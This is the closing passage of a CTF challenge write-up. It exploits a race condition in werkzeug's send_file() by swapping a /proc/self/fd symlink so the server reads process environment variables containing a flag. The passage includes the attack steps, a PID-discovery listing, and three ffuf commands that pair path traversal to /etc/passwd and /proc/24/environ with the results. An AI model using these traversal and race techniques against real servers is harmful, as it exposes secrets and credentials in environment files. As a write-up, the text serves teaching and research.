</span></code></pre>
<p>This is effectively the symlink swap gadget we were looking for! If we had pointed a <code>send_file()</code> at <code>/proc/452/fd/3</code> with the correct timing, it could read the <em>size</em> of <code>/etc/passwd</code> with the <em>content</em> of <code>/proc/self/environ</code>!</p>
<p>To be clearer, the following steps should happen:</p>
<ol>
<li>Trigger a long-running job via the SSRF to get <code>FLAG</code> into <code>/proc/$RUNNER_PID/environ</code></li>
<li>Request <code>send_file(&quot;/etc/passwd&quot;)</code>, creating <code>/proc/self/fd/13 -&gt; /etc/passwd</code></li>
<li>Request <code>send_file(&quot;/proc/self/fd/13&quot;)</code>. <code>os.stat</code> follows the symlink to <code>/etc/passwd</code> and gets back 967 as the size. Now waits</li>
<li><em>Step 2</em> is finished, closing file descriptor 13</li>
<li>Request <code>send_file(&quot;/proc/$RUNNER_PID/environ&quot;)</code>, creating <code>/proc/self/fd/13 -&gt; /proc/$RUNNER_PID/environ</code></li>
<li><em>Step 3</em> continues to <code>open()</code> and follows the symlink now pointing to <code>/proc/$RUNNER_PID/environ</code>. Reads its content and returns it to gunicorn</li>
<li>gunicorn gets <code>Content-Length: 967</code> with a body being the runner's environment variables. It reads the first 967 bytes of that content and sends those back to the client</li>
</ol>
<p>There are a few unknowns, such as the exact timing (which we can fix by just spamming many attempts) and the runner PID. Note that we don't need to know the app PID because <code>self</code> refers to it.</p>
<p>Finding the PID isn't hard either. Using our file read, we can iterate through specific <code>/proc</code> files. We can't check <code>/proc/.../cmdline</code> for the same reason we also can't read environ, but the process has a very unique <code>cwd</code> (current working directory):</p>
<pre><code data-lang="Shell"><span class="hl-source hl-shell hl-shell"><span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">$</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ls</span></span> <span class="hl-meta hl-parameter hl-option hl-shell"><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell">-</span>la</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/proc/<span class="hl-constant hl-other hl-wildcard hl-asterisk hl-shell">*</span>/cwd</span></span></span>
<span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">lrwxrwxrwx</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">1</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span>  <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span>  <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">0</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">Aug</span></span>  <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">3</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">14:46</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/proc/7/cwd</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">-</span></span><span class="hl-meta hl-redirection hl-shell"><span class="hl-keyword hl-operator hl-assignment hl-redirection hl-shell">&gt;</span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/app</span></span></span></span>
<span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">lrwxrwxrwx</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">1</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span>  <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span>  <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">0</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">Aug</span></span>  <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">3</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">14:46</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/proc/21/cwd</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">-</span></span><span class="hl-meta hl-redirection hl-shell"><span class="hl-keyword hl-operator hl-assignment hl-redirection hl-shell">&gt;</span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/app</span></span></span></span>
<span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">lrwxrwxrwx</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">1</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span>  <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span>  <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">0</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">Aug</span></span>  <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">3</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">14:46</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/proc/24/cwd</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">-</span></span><span class="hl-meta hl-redirection hl-shell"><span class="hl-keyword hl-operator hl-assignment hl-redirection hl-shell">&gt;</span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/work/c7729b1b067f47e982202d03ae9ae6eb</span></span></span></span>
<span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">lrwxrwxrwx</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">1</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span>  <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span>  <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">0</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">Aug</span></span>  <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">3</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">14:46</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/proc/25/cwd</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">-</span></span><span class="hl-meta hl-redirection hl-shell"><span class="hl-keyword hl-operator hl-assignment hl-redirection hl-shell">&gt;</span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/app</span></span></span></span>

<p>Our <code>runner.py</code> starts in <code>/work/c7729b1b067f47e982202d03ae9ae6eb</code>. We can follow it to read the <code>build.log</code> it writes, for example:</p>

</span></code></pre>
<blockquote>
<p><code>pid=24</code></p>
</blockquote>
<p>Now all that's left is to launch the job that sets the environment variable and spam the 3 file reads we came up with until it returns the flag.</p>
<p>We should make the fake size (passwd) smaller than the real size (environ), because otherwise, gunicorn infinitely waits on the rest. Currently, the environment is ~137 bytes, while the passwd is 967 bytes. We could choose a smaller file for the fake size, but since we have control over the format string, we can also just repeat <code>$FLAG$FLAG$FLAG...</code> a couple times to reach the size.</p>

</span></code></pre>
<p>Now there are the two symlink-swapping file reads (with the found PID &quot;24&quot; of the environ we want to read):</p>
<pre><code data-lang="Bash"><span class="hl-source hl-shell hl-bash"><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">ffuf</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>u</span> <span class="hl-string hl-quoted hl-single hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&#39;</span>http://localhost:13337/download/..%2Fproc%2F24%2Fenviron#FUZZ<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&#39;</span></span><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>w</span> <span class="hl-keyword hl-operator hl-assignment hl-redirection hl-process hl-shell">&lt;</span><span class="hl-punctuation hl-section hl-parens hl-begin hl-shell">(</span><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">seq</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> 1 100000</span><span class="hl-punctuation hl-section hl-parens hl-end hl-shell">)</span><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>H</span> <span class="hl-string hl-quoted hl-single hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&#39;</span>Cookie: session=ey...8k<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&#39;</span></span></span>
</span></code></pre>
<pre><code data-lang="Bash"><span class="hl-source hl-shell hl-bash"><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">ffuf</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>u</span> <span class="hl-string hl-quoted hl-single hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&#39;</span>http://localhost:13337/download/..%2Fetc%2Fpasswd#FUZZ<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&#39;</span></span><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>w</span> <span class="hl-keyword hl-operator hl-assignment hl-redirection hl-process hl-shell">&lt;</span><span class="hl-punctuation hl-section hl-parens hl-begin hl-shell">(</span><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">seq</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> 1 100000</span><span class="hl-punctuation hl-section hl-parens hl-end hl-shell">)</span><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>H</span> <span class="hl-string hl-quoted hl-single hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&#39;</span>Cookie: session=ey...8k<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&#39;</span></span></span>
</span></code></pre>
<p>And finally, the command that <em>reads</em> the swapping symlink, at some point returning the flag. Using <code>-mr FLAG</code> we can <strong>m</strong>atch for the <strong>r</strong>egex &quot;FLAG&quot; in the body, and <code>-od ffuf</code> as the <strong>o</strong>utput <strong>d</strong>ebug directory, where all matching responses are written into a directory (for us to read the flag when it hit).</p>
<pre><code data-lang="Bash"><span class="hl-source hl-shell hl-bash"><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">ffuf</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>u</span> <span class="hl-string hl-quoted hl-single hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&#39;</span>http://localhost:13337/download/..%2Fproc%2Fself%2Ffd%2F13#FUZZ<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&#39;</span></span><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>mr</span> FLAG<span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>od</span> ffuf<span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>w</span> <span class="hl-keyword hl-operator hl-assignment hl-redirection hl-process hl-shell">&lt;</span><span class="hl-punctuation hl-section hl-parens hl-begin hl-shell">(</span><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">seq</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> 1 100000</span><span class="hl-punctuation hl-section hl-parens hl-end hl-shell">)</span><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>H</span> <span class="hl-string hl-quoted hl-single hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&#39;</span>Cookie: session=ey...8k<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&#39;</span></span></span>
</span></code></pre>
<p>Running all 3 commands at the same time on our target (while the runner job is still running), we eventually get some matches in the 3rd ffuf instance:</p>
<pre><code data-lang="Log"><span class="hl-text hl-log">[Status: <span class="hl-meta hl-number hl-integer hl-log"><span class="hl-constant hl-numeric hl-value hl-log">200</span></span>, Size: <span class="hl-meta hl-number hl-integer hl-log"><span class="hl-constant hl-numeric hl-value hl-log">967</span></span>, Words: <span class="hl-meta hl-number hl-integer hl-log"><span class="hl-constant hl-numeric hl-value hl-log">1</span></span>, Lines: <span class="hl-meta hl-number hl-integer hl-log"><span class="hl-constant hl-numeric hl-value hl-log">1</span></span>, Duration: 313ms]
| RES | 03c23f286ff385424ad86870de6ffa90
    * FUZZ: <span class="hl-meta hl-number hl-integer hl-log"><span class="hl-constant hl-numeric hl-value hl-log">6921</span></span>

<h2 id="conclusion">Conclusion</h2>
<p>This challenge started off with some well-known parser differentials, and ended spectacularly with a race condition inside werkzeug. If your file read primitive is fast, this is a generic technique for reading <em>special files</em> with <code>send_file()</code>. I'm sure the same <code>/fd</code> idea will also help exploit other functionalities vulnerable to race conditions.</p>
<p>Thanks to @caarab for creating the challenge!</p>

</article>
